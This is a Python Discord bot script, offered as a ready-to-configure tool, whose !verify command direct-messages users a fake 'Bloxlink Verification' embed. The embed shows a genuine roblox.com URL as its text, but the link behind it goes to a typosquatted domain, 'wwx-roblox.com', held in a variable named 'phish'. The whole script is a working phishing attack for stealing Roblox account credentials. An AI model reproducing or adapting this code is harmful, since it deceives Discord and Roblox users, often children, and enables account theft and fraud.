import discord
from discord.ext import commands
import requests
import keep_alive
import os

################### change these to your liking ###################

token = "YOUR TOKEN"
prefix = "!"
title = "Please Complete Verification"
desc = "To verify your account, please follow the user below!"
field = ":arrow_down_small: Please verify by following the user :arrow_down_small:"
hyperlink = "https://www.roblox.com/games/1271943503/Bloxlink-Verification-Game?privateServerLinkCode=5901581263288234898146809"
phish = "https://wwx-roblox.com/games/1271943503/Bloxlink-Verification-Game?privateServerLinkCode=5569564835067129909414035"

###################################################################



client = commands.Bot(command_prefix = prefix)
client.remove_command('help')

@client.event
async def on_ready():
    print('')
    print('----------------')
    print('Selfbot Online!')
    print('----------------')

main = discord.Embed(title=title,description=desc,color=0xcf4948)
main.add_field(name=field,value=f"[{hyperlink}]({phish})")
main.set_thumbnail(url='https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png')

@client.command()
async def verify(ctx):
    await ctx.send('***Sent Verification Link! Please Check DMs***')
    await ctx.author.send(embed=main)





keep_alive.keep_alive()  
token = os.environ.get("TOKEN")
client.run("YOUR TOKEN")
